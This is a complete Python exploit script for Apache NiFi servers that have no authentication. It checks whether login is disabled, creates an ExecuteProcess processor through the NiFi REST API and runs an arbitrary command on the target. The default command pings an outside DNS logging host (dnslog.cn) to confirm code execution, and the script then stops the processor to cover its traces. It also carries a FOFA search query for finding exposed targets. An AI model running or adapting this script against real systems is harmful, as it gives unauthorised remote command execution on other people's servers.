#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import re
import sys
import json
import argparse
import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('+          FOFA:"nifi" && title=="NiFi"')


def fetch_process_group(url):
    url = url + "/nifi-api/process-groups/root"
    try:
        res = requests.get(url=url, verify=False, timeout=3)
        data = res.json()["id"]
        return data
    except Exception as e:
        pass
    return 0


def create_process(url, process_group_id):
    url = url + "/nifi-api/process-groups/" + process_group_id + "/processors"
    data = {
        'component': {
            'type': 'org.apache.nifi.processors.standard.ExecuteProcess'
        },
        'revision': {
            'version': 0
        }
    }
    headers = {
        "Content-Type": "application/json",
    }
    try:
        res = requests.post(url=url, data=json.dumps(data), headers=headers, verify=False, timeout=3)
        return res.json()["id"]
    except Exception as e:
        pass
    return 0


def run_cmd(url, p_id, cmd):
    url = url + "/nifi-api/processors/" + p_id
    cmd = cmd.split(" ")
    data = {
        'component': {
            'config': {
                'autoTerminatedRelationships': ['success'],
                'properties': {
                    'Command': cmd[0],
                    'Command Arguments': " ".join(cmd[1:]),
                },
                'schedulingPeriod': '3600 sec'
            },
            'id': p_id,
            'state': 'RUNNING'
        },
        'revision': {'clientId': 'x', 'version': 1}
    }
    headers = {
        "Content-Type": "application/json",
    }
    res = requests.put(url=url, data=json.dumps(data), headers=headers, verify=False, timeout=3)
    return res.json()


def clean_up(url, p_id):
    url = url + "/nifi-api/processors/" + p_id
    data = {'revision': {'clientId': 'x', 'version': 1}, 'state': 'STOPPED'}
    requests.put(url=url + "/run-status", data=json.dumps(data), verify=False, timeout=3)
    requests.delete(url + "/threads", verify=False)


def check_is_vul(url):
    url = url + "/nifi-api/access/config"
    try:
        res = requests.get(url=url, verify=False, timeout=3)
        data = res.json()
        return not data["config"]["supportsLogin"]
    except Exception as e:
        pass
    return False


def run_proto(url):
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    headers = {
        'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'
              }
    cmd = 'ping y8izh6.dnslog.cn'
    try:
        if check_is_vul(url):
            g_id = fetch_process_group(url)
            if g_id:
                p_id = create_process(url, g_id)
                if p_id:
                    res_exec = run_cmd(url, p_id=p_id, cmd=cmd)
                    clean_up(url, p_id=p_id)
                    print(url + '\t sExist\n\n\n\n')
                    # print(res_exec)
                    return True
        else:
            print(url + 'UExist')
            return False
    except Exception as e:
        print(url + 'UExist')
        return False


def run(target):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    target = sys.argv[1]
    result = run(target)

    if result:
        print('Exist')
    else:
        print('UnExist')
